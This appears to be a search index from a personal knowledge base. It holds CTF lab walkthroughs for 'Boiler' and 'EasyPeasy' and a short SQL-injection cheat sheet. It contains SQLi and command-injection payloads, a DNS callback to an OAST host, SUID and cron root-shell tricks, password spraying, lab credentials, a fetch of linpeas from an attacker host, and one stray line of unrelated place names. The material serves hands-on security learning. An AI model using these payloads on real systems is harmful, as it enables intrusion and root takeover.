{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Kareem's Knowledge Base","text":"<p>Search (top right) for commands, concepts, and write-ups.</p> <p>Inbox first: drop raw notes in <code>docs/inbox/</code> and tag later.</p> <p>Tip: Use global search + the Tags page to filter by domain (ctf, math, ai, kaggle, swe) and tactic (privesc, enum, rce...).</p>","tags":["home","index"]},{"location":"tags/","title":"Tags","text":"<p>{{ tags }}</p>"},{"location":"ai/cv/_index/","title":"Cv","text":"","tags":["hub"]},{"location":"ai/dl/_index/","title":"Dl","text":"","tags":["hub"]},{"location":"ai/ml/_index/","title":"Ml","text":"","tags":["hub"]},{"location":"ai/nlp/_index/","title":"Nlp","text":"","tags":["hub"]},{"location":"ai/optimization/_index/","title":"Optimization","text":"","tags":["hub"]},{"location":"ai/rl/_index/","title":"Rl","text":"","tags":["hub"]},{"location":"ctf/crypto/_index/","title":"Crypto","text":"","tags":["hub"]},{"location":"ctf/forensics/_index/","title":"Forensics","text":"","tags":["hub"]},{"location":"ctf/osint/_index/","title":"Osint","text":"","tags":["hub"]},{"location":"ctf/pwn/_index/","title":"Pwn","text":"","tags":["hub"]},{"location":"ctf/reversing/_index/","title":"Reversing","text":"","tags":["hub"]},{"location":"ctf/stego/_index/","title":"Stego","text":"","tags":["hub"]},{"location":"ctf/web/_index/","title":"Web","text":"","tags":["hub"]},{"location":"ctf/web/sql-injection/","title":"Basic SQLi Cheats","text":"<p>```sql ' OR 1=1 -- ' UNION SELECT 1,@@version --</p> <p>kalaniketan wedding mall lns jewellers moazzam jahi market pista house mughal-e-azam tawaif-e-tandoor</p>","tags":["ctf","web","sqli","cheatsheet"]},{"location":"ctf/web/boiler-ctf/","title":"Boiler CTF \u2014 Walkthrough &amp; Learning Notes (human-style) \ud83d\ude80","text":"<p>Goal: be extremely educational while keeping the human touch \u2014 emojis, side-notes, and gentle explanations.</p>"},{"location":"ctf/web/boiler-ctf/#scope-target","title":"\ud83d\uddfa\ufe0f Scope &amp; Target","text":"<ul> <li>Host: <code>10.201.33.188</code></li> <li>Observed services</li> <li>HTTP (Joomla) \u2014 <code>/joomla/</code> and <code>/joomla/administrator/</code></li> <li>SSH \u2014 custom port <code>55007</code></li> <li>Webmin/MiniServ \u2014 <code>10000/tcp</code> \u2192 <code>MiniServ/1.930</code> (self-signed TLS)</li> </ul>"},{"location":"ctf/web/boiler-ctf/#recon","title":"\ud83d\udd0e Recon","text":"<pre><code>nmap -sV -p 80,10000,55007 10.201.33.188\n</code></pre> <ul> <li><code>10000/tcp open  http  MiniServ 1.930 (Webmin httpd)</code></li> <li>Joomla front-end &amp; admin backend reachable under <code>/joomla/</code></li> </ul>"},{"location":"ctf/web/boiler-ctf/#robotstxt-hidden-path-token","title":"\ud83e\udd16 robots.txt \u2192 hidden path + token","text":"<p>Paths:</p> <pre><code>/yellow /not /a+rabbit /hole /or /is /it\n/tmp /.ssh\n</code></pre> <p>Numbers:</p> <pre><code>079 084 108 105 ... 081\n</code></pre> <p>Decode:</p> <pre><code>echo '079 084 ... 081' | awk '{for(i=1;i&lt;=NF;i++) printf \"%c\",$i}' | base64 -d\n# -&gt; 99b0660cd95adea327c54182baa51584\n</code></pre> <p>Follow the \u201crabbit hole\u201d (URL-encode <code>+</code> \u2192 <code>%2B</code>):</p> <pre><code>/yellow/not/a%2Brabbit/hole/or/is/it/\n</code></pre>"},{"location":"ctf/web/boiler-ctf/#deeppaste-ssidspsks","title":"\ud83e\uddfe DeepPaste \u2192 SSIDs/PSKs","text":"<p>Examples: - <code>HIROSAKI_Free_W1-F1 : H_Free934!</code> - <code>DKIF-G : Fsdf324T96</code></p> <p>BSSID \u2260 password. BSSID is a MAC like <code>aa:bb:cc:dd:ee:ff</code>. Use wardriving DBs or <code>*.netxml</code> logs to get BSSID.</p>"},{"location":"ctf/web/boiler-ctf/#command-injection-osci-cwe-78-owasp-a032021","title":"\ud83e\uddea Command Injection (OSCI, CWE-78; OWASP A03:2021) \u2b50","text":"<p>Endpoint:</p> <pre><code>/joomla/_test/index.php?plot=LINUX\n</code></pre> <p>Why <code>plot=ls</code> fails but <code>plot=|ls -la</code> works:</p> <pre><code>system(\"gnuplot -e set term $plot\"); // shell metacharacters break out\n</code></pre> <p>First-wave canaries (URL-encode if blocked):</p> <pre><code>;id |id &amp;&amp;id ||id %0aid `id` $(id)\n</code></pre> <p>Blind:</p> <pre><code>;sleep 5 ;nslookup TOKEN.oast.site\n</code></pre>"},{"location":"ctf/web/boiler-ctf/#creds-pivot-backupsh-gift","title":"\ud83d\udd10 Creds pivot \u2014 backup.sh gift \ud83c\udf81","text":"<p>Password in comment:</p> <pre><code># superduperp@$$no1knows\n</code></pre> <p>Use for <code>stoner</code>:</p> <pre><code>su - stoner\n# or\nssh -p 55007 stoner@10.201.33.188\n</code></pre>"},{"location":"ctf/web/boiler-ctf/#priv-esc-with-suid-find-root","title":"\ud83e\uddd7 Priv-Esc with SUID find \u2192 Root \ud83e\udde8","text":"<p>SUID:</p> <pre><code>-r-sr-xr-x 1 root root ... /usr/bin/find\n</code></pre> <p>Root shell:</p> <pre><code>/usr/bin/find . -maxdepth 0 -exec /bin/bash -p \\; -quit\n</code></pre> <p>Alt (if <code>bash -p</code> blocked):</p> <pre><code>/usr/bin/find . -maxdepth 0 -exec sh -c 'cp /bin/bash /tmp/rbash &amp;&amp; chmod u+s /tmp/rbash' \\; -quit\n/tmp/rbash -p\n</code></pre>"},{"location":"ctf/web/boiler-ctf/#webmin-tls-firefox-lab-bypass","title":"\ud83d\udd10 Webmin TLS (Firefox lab bypass)","text":"<ul> <li>Use IP: <code>https://10.201.33.188:10000/</code></li> <li>Add Exception (Certificates \u2192 Servers \u2192 Add Exception)</li> <li><code>about:config</code> \u2192 <code>browser.xul.error_pages.expert_bad_cert=true</code></li> <li>Chrome/Chromium: type <code>thisisunsafe</code></li> </ul>"},{"location":"ctf/web/boiler-ctf/#reusable-lessons-checklist","title":"\ud83e\udde0 Reusable lessons (checklist)","text":"<ul> <li>Probe OSCI with <code>;|&amp;&amp;||%0a</code> canaries; switch to time/DNS/file for blind.</li> <li>Robots.txt is a map, not a lock.</li> <li>SUID \u2192 check GTFOBins (find, tar, vim/less, etc.).</li> <li>SSID/PSK \u2260 BSSID.</li> </ul> <p>You did great. Keep the YAML cheat-sheet handy for future rooms. \u2728</p>"},{"location":"ctf/web/easypeasy-ctf/","title":"EasyPeasy CTF \u2014 Full Walkthrough (Ultra\u2011Educational)","text":"<p>Goal</p> <p>Solve EasyPeasy end\u2011to\u2011end and learn a reusable methodology you can apply to most beginner\u2013intermediate web CTFs. You\u2019ll see what to do, why it works, and the mental models behind each step.</p>","tags":["CTF","Web","Enumeration","Exploitation","Privilege Escalation"]},{"location":"ctf/web/easypeasy-ctf/#tldr","title":"TL;DR","text":"<ul> <li>Map the attack surface \u2192 nmap + HTTP recon</li> <li>Find lightweight clues \u2192 <code>/robots.txt</code>, hidden notes, wordlists</li> <li>Pivot from hints to execution \u2192 decode/encode, brute logical steps, avoid rabbit holes</li> <li>Privesc via capabilities/SUID or misconfig (illustrative patterns shown below)</li> </ul>","tags":["CTF","Web","Enumeration","Exploitation","Privilege Escalation"]},{"location":"ctf/web/easypeasy-ctf/#folder-layout-local-repo","title":"Folder Layout (Local \u2192 Repo)","text":"<p>Your local artifacts (from your machine):</p> <pre><code>/home/makar/CTFs/easypeasyctf\n\u251c\u2500\u2500 10.201.72.248:65524/      # scraped pages or downloaded content\n\u251c\u2500\u2500 binarycodepixabay.jpg     # stego candidate (if any)\n\u251c\u2500\u2500 easypeasy_1596838725703.txt\n\u251c\u2500\u2500 easypeasyctf_nmap         # nmap output(s)\n\u251c\u2500\u2500 easypeasyctf_writeup      # your original notes (source of truth)\n\u251c\u2500\u2500 hash.txt                  # hashes found during the run\n\u2514\u2500\u2500 secrettext.txt            # suspicious clues/notes\n</code></pre> <p>Where this page should live in your Git repo:</p> <pre><code>~/kareem-notes-pro/docs/ctf/web/easypeasy-ctf/README.md\n</code></pre>","tags":["CTF","Web","Enumeration","Exploitation","Privilege Escalation"]},{"location":"ctf/web/easypeasy-ctf/#learning-objectives","title":"Learning Objectives","text":"<ol> <li>Enumeration Mindset: Turn vague surfaces into concrete leads systematically.</li> <li>Signal vs Noise: Recognize actionable clues (hashes, encodings, hidden paths).</li> <li>Tool\u2192Theory Bridge: Understand the protocol/encoding behind the tool output.</li> <li>Repeatable Playbook: Export your steps as a reusable checklist/cheatsheet.</li> </ol>","tags":["CTF","Web","Enumeration","Exploitation","Privilege Escalation"]},{"location":"ctf/web/easypeasy-ctf/#0-rules-lab-hygiene","title":"0) Rules &amp; Lab Hygiene","text":"<ul> <li>Stay inside the CTF scope (host/IP provided by the platform).  </li> <li>Log everything: timestamps, commands, outputs, and conclusions right next to them.  </li> <li>Use a scratchpad \u2192 narrative flow (you did this via <code>easypeasyctf_writeup</code>).</li> </ul>","tags":["CTF","Web","Enumeration","Exploitation","Privilege Escalation"]},{"location":"ctf/web/easypeasy-ctf/#1-reconnaissance","title":"1) Reconnaissance","text":"","tags":["CTF","Web","Enumeration","Exploitation","Privilege Escalation"]},{"location":"ctf/web/easypeasy-ctf/#11-host-discovery-port-scan","title":"1.1 Host Discovery &amp; Port Scan","text":"<p>Use a quick top-ports scan to find open services, then a full scan if needed.</p> <pre><code># Quick scan\nnmap -Pn -sC -sV -vv -oN easypeasyctf_nmap &lt;TARGET_IP&gt;\n\n# If the target uses a non-default port you already know (e.g., 65524), include it:\nnmap -Pn -sC -sV -p 65524 -vv -oN easypeasyctf_nmap_specific &lt;TARGET_IP&gt;\n\n# Optional: full range + UDP (heavier)\nnmap -Pn -p- -sV -oN easypeasyctf_nmap_all &lt;TARGET_IP&gt;\n</code></pre> <p>Why these flags? - <code>-sC</code> runs default scripts (safe discovery of common misconfigs). - <code>-sV</code> fingerprints service versions \u2192 feeds Google/CVE lookups. - <code>-Pn</code> avoids unreliable ping checks in lab firewall/NAT setups.</p> <p>Tip</p> <p>Keep one canonical nmap file per box with the best information; keep others for experiments.</p>","tags":["CTF","Web","Enumeration","Exploitation","Privilege Escalation"]},{"location":"ctf/web/easypeasy-ctf/#12-web-surface-mapping","title":"1.2 Web Surface Mapping","text":"<p>If HTTP/HTTPS is open:</p> <pre><code>whatweb http://&lt;TARGET_IP&gt;:&lt;PORT&gt;\ncurl -I http://&lt;TARGET_IP&gt;:&lt;PORT&gt;/\n</code></pre> <p>Then check the usual low-hanging fruit:</p> <pre><code># robots, sitemap, server headers, source comments\ncurl -s http://&lt;TARGET&gt;:&lt;PORT&gt;/robots.txt\ncurl -s http://&lt;TARGET&gt;:&lt;PORT&gt;/ | pup 'a attr{href}'\ncurl -s http://&lt;TARGET&gt;:&lt;PORT&gt;/ | pup 'script,link,meta'\n</code></pre> <p>Why this matters: robots/sitemap and HTML comments often leak keywords, usernames, hidden paths, or encodings that chain later.</p>","tags":["CTF","Web","Enumeration","Exploitation","Privilege Escalation"]},{"location":"ctf/web/easypeasy-ctf/#13-wordlists-content-discovery","title":"1.3 Wordlists &amp; Content Discovery","text":"<pre><code>gobuster dir -u http://&lt;TARGET&gt;:&lt;PORT&gt;/ -w /usr/share/wordlists/dirb/common.txt -o gobuster_common.txt -t 50\n# If hints mention 'easy', 'peasy', 'chocolate', try themed custom lists as well.\n</code></pre> <p>Model: Hypothesis-driven brute force. Start with common lists; guide deeper by clues you\u2019ve already found.</p>","tags":["CTF","Web","Enumeration","Exploitation","Privilege Escalation"]},{"location":"ctf/web/easypeasy-ctf/#2-from-clues-to-credentials-decoding-hashing-101","title":"2) From Clues to Credentials (Decoding &amp; Hashing 101)","text":"","tags":["CTF","Web","Enumeration","Exploitation","Privilege Escalation"]},{"location":"ctf/web/easypeasy-ctf/#21-recognize-encodings-by-eye","title":"2.1 Recognize Encodings by Eye","text":"<ul> <li>Base64: Looks like <code>A\u2013Z a\u2013z 0\u20139 + /</code> with <code>=</code> padding. Try:</li> </ul> <pre><code>echo 'c2VjcmV0' | base64 -d\n</code></pre> <ul> <li>Hex: pairs of <code>[0-9a-f]</code>. Try:</li> </ul> <pre><code>echo '74657374' | xxd -r -p\n</code></pre> <ul> <li>URL-encoding: <code>%2f</code>, <code>%3a</code>\u2026 Use <code>python -c</code> or <code>urldecode</code>.</li> <li>ROT/N: letters shifted; <code>rot13</code> or <code>cyberchef</code>.</li> <li>Stego suspects: Images with EXIF oddities or appended data:</li> </ul> <pre><code>exiftool binarycodepixabay.jpg\nstrings -n 8 binarycodepixabay.jpg | less\nbinwalk -eM binarycodepixabay.jpg\n</code></pre>","tags":["CTF","Web","Enumeration","Exploitation","Privilege Escalation"]},{"location":"ctf/web/easypeasy-ctf/#22-hash-identification","title":"2.2 Hash Identification","text":"<p>Use <code>hashid</code>/<code>hash-identifier</code>:</p> <pre><code>hashid -m -j hash.txt\n</code></pre> <p>If it\u2019s a crackable fast hash (MD5/SHA1/NTLM), try rockyou quickly:</p> <pre><code>john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt\n# or\nhashcat -m &lt;mode&gt; -a 0 hash.txt /usr/share/wordlists/rockyou.txt\n</code></pre>","tags":["CTF","Web","Enumeration","Exploitation","Privilege Escalation"]},{"location":"ctf/web/easypeasy-ctf/#3-exploitation-turning-findings-into-access","title":"3) Exploitation (Turning Findings into Access)","text":"","tags":["CTF","Web","Enumeration","Exploitation","Privilege Escalation"]},{"location":"ctf/web/easypeasy-ctf/#31-common-web-flows","title":"3.1 Common Web Flows","text":"<ul> <li>Leaked creds \u2192 <code>/login</code> or basic auth.  </li> <li>LFI/RFI \u2192 read <code>/etc/passwd</code> or app configs.  </li> <li>Upload bypass \u2192 webshell (php, aspx) with extension or MIME tricks.  </li> <li>Weak cookies/JWT \u2192 forge or decode to escalate roles.</li> </ul> <p>Example: If a hint reveals a password theme (e.g., <code>easy-peasy-&lt;year&gt;</code>), build a small custom list and try:</p> <pre><code># password spraying example with hydra\nhydra -l &lt;user&gt; -P easy_peasy_custom.txt http-get://&lt;TARGET&gt;:&lt;PORT&gt;/login\n</code></pre>","tags":["CTF","Web","Enumeration","Exploitation","Privilege Escalation"]},{"location":"ctf/web/easypeasy-ctf/#32-shell-stabilization","title":"3.2 Shell Stabilization","text":"<p>Once you land a shell:</p> <pre><code>python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\nCTRL+Z\nstty raw -echo; fg\nexport TERM=xterm-256color\n</code></pre>","tags":["CTF","Web","Enumeration","Exploitation","Privilege Escalation"]},{"location":"ctf/web/easypeasy-ctf/#4-privilege-escalation-linux-patterns","title":"4) Privilege Escalation (Linux Patterns)","text":"","tags":["CTF","Web","Enumeration","Exploitation","Privilege Escalation"]},{"location":"ctf/web/easypeasy-ctf/#41-suid-capabilities","title":"4.1 SUID / Capabilities","text":"<pre><code># SUID hunting\nfind / -perm -4000 -type f 2&gt;/dev/null\n\n# Capabilities\ngetcap -r / 2&gt;/dev/null\n</code></pre> <p>If you see unusual SUID binaries (custom scripts, older interpreters), check GTFOBins patterns.</p>","tags":["CTF","Web","Enumeration","Exploitation","Privilege Escalation"]},{"location":"ctf/web/easypeasy-ctf/#42-weak-service-files-cron","title":"4.2 Weak Service Files / Cron","text":"<pre><code>systemctl list-timers --all\ncat /etc/crontab\nls -l /etc/cron.*/*\n</code></pre> <ul> <li>World-writable scripts run as root? Replace payload safely to get a root shell.  </li> <li>Important: Prefer a file-drop + root-owned SUID bash method during CTF; do not use destructive payloads.</li> </ul> <p>Example payload (explain\u2011and\u2011learn):</p> <pre><code># i will run as root\n/bin/cp /bin/bash /tmp/bashroot\n/bin/chown root:root /tmp/bashroot\n/bin/chmod 4755 /tmp/bashroot\n</code></pre> <p>Why it works: Setuid bit (4) on a root\u2011owned binary lets regular users execute it with effective UID 0. Running <code>/tmp/bashroot -p</code> yields a root shell in a contained lab. Remove after use.</p>","tags":["CTF","Web","Enumeration","Exploitation","Privilege Escalation"]},{"location":"ctf/web/easypeasy-ctf/#43-path-hijacking-insecure-scripts","title":"4.3 Path Hijacking / Insecure Scripts","text":"<p>Search for scripts that call <code>/bin/sh</code> or unsanitized <code>$PATH</code>:</p> <pre><code>grep -R \"sh \" /etc/ 2&gt;/dev/null | head\nstrings /usr/local/bin/* | grep -E '(/bin/sh|sudo|scp|tar)'\n</code></pre>","tags":["CTF","Web","Enumeration","Exploitation","Privilege Escalation"]},{"location":"ctf/web/easypeasy-ctf/#5-post-exploitation-notes","title":"5) Post-Exploitation Notes","text":"<ul> <li>Read flags, capture exact paths.</li> <li>Enumerate interesting files: <code>/var/www/</code>, <code>/home/*/.ssh/</code>, <code>/opt/</code> apps.</li> <li>Screenshot or copy small configs that explain the root cause (education &gt; just the flag).</li> </ul>","tags":["CTF","Web","Enumeration","Exploitation","Privilege Escalation"]},{"location":"ctf/web/easypeasy-ctf/#6-cheat-sheet-reusable","title":"6) Cheat Sheet (Reusable)","text":"<p>Enumeration</p> <pre><code>nmap -Pn -sC -sV -oN scan.txt &lt;ip&gt;\nwhatweb http://&lt;ip&gt;:&lt;port&gt;\ngobuster dir -u http://&lt;ip&gt;:&lt;port&gt;/ -w /usr/share/wordlists/dirb/common.txt\n</code></pre> <p>Decoding</p> <pre><code>base64 -d, xxd -r -p, rot13, urldecode\nexiftool/binwalk/strings (for images/binaries)\n</code></pre> <p>Privesc</p> <pre><code>find / -perm -4000 -type f 2&gt;/dev/null\ngetcap -r / 2&gt;/dev/null\ncat /etc/crontab; systemctl list-timers --all\n</code></pre>","tags":["CTF","Web","Enumeration","Exploitation","Privilege Escalation"]},{"location":"ctf/web/easypeasy-ctf/#7-run-log-your-original-notes","title":"7) Run Log (Your Original Notes)","text":"<p>Keep raw notes to preserve how you reasoned under uncertainty. This is gold for learning.</p> Click to expand raw notes <pre><code>sudo openvpn 'vpn/Karma.47 (3).ovpn'\nPS C:\\Users\\makar&gt; ./wsl-vpn-routes.ps1\n\n# Nmap 7.94SVN scan initiated Tue Sep  2 08:19:32 2025 as: nmap -p- -A -T4 -v -oN easypeasyctf_nmap 10.201.72.248\nWarning: 10.201.72.248 giving up on port because retransmission cap hit (6).\nNmap scan report for 10.201.72.248\nHost is up (0.23s latency).\nNot shown: 65440 closed tcp ports (conn-refused), 92 filtered tcp ports (no-response)\nPORT      STATE SERVICE VERSION\n80/tcp    open  http    nginx 1.16.1\n| http-methods:\n|_  Supported Methods: GET HEAD\n| http-robots.txt: 1 disallowed entry\n|_/\n|_http-title: Welcome to nginx!\n|_http-server-header: nginx/1.16.1\n6498/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 30:4a:2b:22:ac:d9:56:09:f2:da:12:20:57:f4:6c:d4 (RSA)\n|   256 bf:86:c9:c7:b7:ef:8c:8b:b9:94:ae:01:88:c0:85:4d (ECDSA)\n|_  256 a1:72:ef:6c:81:29:13:ef:5a:6c:24:03:4c:fe:3d:0b (ED25519)\n65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))\n|_http-title: Apache2 Debian Default Page: It works\n|_http-server-header: Apache/2.4.43 (Ubuntu)\n| http-methods:\n|_  Supported Methods: GET POST OPTIONS HEAD\n| http-robots.txt: 1 disallowed entry\n|_/\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nRead data files from: /usr/bin/../share/nmap\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Tue Sep  2 08:51:00 2025 -- 1 IP address (1 host up) scanned in 1888.23 seconds\n\nmakar@LAPTOP-ASUME87D:~  % gobuster dir -u http://10.201.72.248/ -w /home/makar/SecLists/Discovery/Web-Content/common.txt\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://10.201.72.248/\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /home/makar/SecLists/Discovery/Web-Content/common.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/hidden               (Status: 301) [Size: 169] [--&gt; http://10.201.72.248/hidden/]\n/index.html           (Status: 200) [Size: 612]\n/robots.txt           (Status: 200) [Size: 43]\nProgress: 4750 / 4750 (100.00%)\n===============================================================\nFinished\n===============================================================\n\nmakar@LAPTOP-ASUME87D:~/CTFs/easypeasyctf  % gobuster dir -u http://10.201.72.248/hidden/ -w /home/makar/SecLists/Discovery/Web-Content/common.txt\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://10.201.72.248/hidden/\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /home/makar/SecLists/Discovery/Web-Content/common.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/index.html           (Status: 200) [Size: 390]\n/whatever             (Status: 301) [Size: 169] [--&gt; http://10.201.72.248/hidden/whatever/]\nProgress: 4750 / 4750 (100.00%)\n===============================================================\nFinished\n===============================================================\n\n#Hidden in the page source was this -&gt; &lt;p hidden&gt;ZmxhZ3tmMXJzN19mbDRnfQ==&lt;/p&gt; and i extensively used cyberchef for this ctf and it gave me \n#input: ZmxhZ3tmMXJzN19mbDRnfQ==                output: flag{f1rs7_fl4g} (From Base64)\n\n#Next i checked the other 65524/tcp open  http  apache site\n\nmakar@LAPTOP-ASUME87D:~/CTFs/easypeasyctf  % gobuster dir -u http://10.201.72.248:65524/ -w /home/makar/SecLists/Discovery/Web-Content/common.txt\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://10.201.72.248:65524/\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /home/makar/SecLists/Discovery/Web-Content/common.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/.htaccess            (Status: 403) [Size: 281]\n/.htpasswd            (Status: 403) [Size: 281]\n/.hta                 (Status: 403) [Size: 281]\n/index.html           (Status: 200) [Size: 10818]\n/robots.txt           (Status: 200) [Size: 153]\n/server-status        (Status: 403) [Size: 281]\nProgress: 4750 / 4750 (100.00%)\n===============================================================\nFinished\n===============================================================\n\n#so two hits\n\nhttp://10.201.72.248:65524/robots.txt\nUser-Agent:*\nDisallow:/\nRobots Not Allowed\nUser-Agent:a18672860d0510e5ab6699730763b250\nAllow:/\nThis Flag Can Enter But Only This Flag No More Exceptions\n#This flag was pretty hard to crack actually. i didnt knew what this actually was. but at the end i tried my trusty https://md5hashing.net/\n\nMd5 hash\ncalculated hash digest\na18672860d0510e5ab6699730763b250\n\nMd5 value\nReversed hash value\nflag{1m_s3c0nd_fl4g}\n\n#Yes, let's go!\n\n# Then in http://10.201.72.248:65524/ we got                            Fl4g 3 : flag{9fdafbd64c47471a8f54cd3fc64cd312} and this bit of info\n#          Apache 2 It Works For Me\n#   &lt;p hidden&gt;its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu&lt;/p&gt;\n#        &lt;/span&gt;\n\n#So, next on cybercheft i tried various base formats and got a hit with Base64 as ObsJmP173N2X6dOrAgEAL0Vu ---&gt; /n0th1ng3ls3m4tt3r\n#So, going to http://10.201.72.248:65524/n0th1ng3ls3m4tt3r/ we get \n\n&lt;center&gt;\n&lt;img src=\"binarycodepixabay.jpg\" width=\"140px\" height=\"140px\"/&gt;\n&lt;p&gt;940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81&lt;/p&gt;\n&lt;/center&gt;\n\n#We were given a downloadable password list and i tested this string against that and got the match\n\nmakar@LAPTOP-ASUME87D:~/CTFs/easypeasyctf  % WORDLIST=/home/makar/CTFs/easypeasyctf/easypeasy_1596838725703.txt\n/home/makar/john-jumbo/run/john \\\n  --format=gost \\\n  --wordlist=\"$WORDLIST\" \\\n  --rules \\\n  hash.txt\n\nUsing default input encoding: UTF-8\nLoaded 1 password hash (gost, GOST R 34.11-94 [64/64])\nWill run 8 OpenMP threads\nPress 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status\nEnabling duplicate candidate password suppressor using 256 MiB\nmypasswordforthatjob (?)\n1g 0:00:00:00 DONE (2025-09-02 09:33) 4.167g/s 17066p/s 17066c/s 17066C/s vickvick..ramiley\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed.\n\n#It was the encryption GOST that was very hard to get. i used the hint to specify the type of hashing algorithm used. Next i got that pic\n\nmakar@LAPTOP-ASUME87D:~/CTFs/easypeasyctf  % wget http://10.201.72.248:65524/n0th1ng3ls3m4tt3r/binarycodepixabay.jpg\n--2025-09-02 09:36:19--  http://10.201.72.248:65524/n0th1ng3ls3m4tt3r/binarycodepixabay.jpg\nConnecting to 10.201.72.248:65524... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 90158 (88K) [image/jpeg]\nSaving to: \u2018binarycodepixabay.jpg\u2019\n\nbinarycodepixabay.jpg                  100%[============================================================================&gt;]  88.04K  34.1KB/s    in 2.6s\n\n2025-09-02 09:36:22 (34.1 KB/s) - \u2018binarycodepixabay.jpg\u2019 saved [90158/90158]\n\nmakar@LAPTOP-ASUME87D:~/CTFs/easypeasyctf  % steghide info binarycodepixabay.jpg\n\"binarycodepixabay.jpg\":\n  format: jpeg\n  capacity: 4.6 KB\nTry to get information about embedded data ? (y/n) y\nEnter passphrase:\n  embedded file \"secrettext.txt\":\n    size: 278.0 Byte\n    encrypted: no\n    compressed: no\nmakar@LAPTOP-ASUME87D:~/CTFs/easypeasyctf  % ls\n10.201.72.248:65524/  binarycodepixabay.jpg  easypeasy_1596838725703.txt  easypeasyctf_nmap  hash.txt\nmakar@LAPTOP-ASUME87D:~/CTFs/easypeasyctf  % steghide extract -sf binarycodepixabay.jpg\nEnter passphrase:\nwrote extracted data to \"secrettext.txt\".\nmakar@LAPTOP-ASUME87D:~/CTFs/easypeasyctf  % ls\n10.201.72.248:65524/  binarycodepixabay.jpg  easypeasy_1596838725703.txt  easypeasyctf_nmap  hash.txt  secrettext.txt\nmakar@LAPTOP-ASUME87D:~/CTFs/easypeasyctf  % cat secrettext.txt\nusername:boring\npassword:\n01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001\n\n#Using cyberchef we get this binary to spell iconvertedmypasswordtobinary which is our password for ssh!!!\n\nmakar@LAPTOP-ASUME87D:~/CTFs/easypeasyctf  % ssh -p 6498 boring@10.201.72.248 \n#(As ssh was at other port than its usual one)\nThe authenticity of host '[10.201.72.248]:6498 ([10.201.72.248]:6498)' can't be established.\nED25519 key fingerprint is SHA256:6XHUSqR7Smm/Z9qPOQEMkXuhmxFm+McHTLbLqKoNL/Q.\nThis key is not known by any other names.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '[10.201.72.248]:6498' (ED25519) to the list of known hosts.\n*************************************************************************\n**        This connection are monitored by government offical          **\n**            Please disconnect if you are not authorized              **\n** A lawsuit will be filed against you if the law is not followed      **\n*************************************************************************\nboring@10.201.72.248's password:\nYou Have 1 Minute Before AC-130 Starts Firing\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\n!!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!\nYou Have 1 Minute Before AC-130 Starts Firing\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\n!!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!\nboring@kral4-PC:~$ whoami\nboring\nboring@kral4-PC:~$ id; uname -a\nuid=1000(boring) gid=1000(boring) groups=1000(boring)\nLinux kral4-PC 4.15.0-106-generic #107-Ubuntu SMP Thu Jun 4 11:27:52 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux\nboring@kral4-PC:~$ ls\nuser.txt\nboring@kral4-PC:~$ cat user.txt\nUser Flag But It Seems Wrong Like It`s Rotated Or Something\nsynt{a0jvgf33zfa0ez4y}\n#(Those are just scary welcome text, nothing to worry about)\n\nUsing Rot13 we get synt{a0jvgf33zfa0ez4y} ---&gt; flag{n0wits33msn0rm4l}\n\n#\n\nboring@kral4-PC:~$ sudo -l\n[sudo] password for boring:\nSorry, try again.\n[sudo] password for boring:\nSorry, user boring may not run sudo on kral4-PC.\nboring@kral4-PC:~$ ls -la /home\ntotal 12\ndrwxr-xr-x  3 root   root   4096 Jun 14  2020 .\ndrwxr-xr-x 23 root   root   4096 Jun 15  2020 ..\ndrwxr-xr-x  5 boring boring 4096 Jun 15  2020 boring\nboring@kral4-PC:/$ ls -la root\nls: cannot open directory 'root': Permission denied\nboring@kral4-PC:/$ cd root\n-bash: cd: root: Permission denied\n#ok, i just got the linpeas.sh and ran it\nboring@kral4-PC:/tmp$ wget http://10.21.223.89:8000/linpeas.sh\n--2025-09-02 02:50:06--  http://10.21.223.89:8000/linpeas.sh\nConnecting to 10.21.223.89:8000... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 956174 (934K) [text/x-sh]\nSaving to: \u2018linpeas.sh\u2019\n\nlinpeas.sh         100%[================&gt;] 933.76K   180KB/s    in 5.2s\n\n2025-09-02 02:50:12 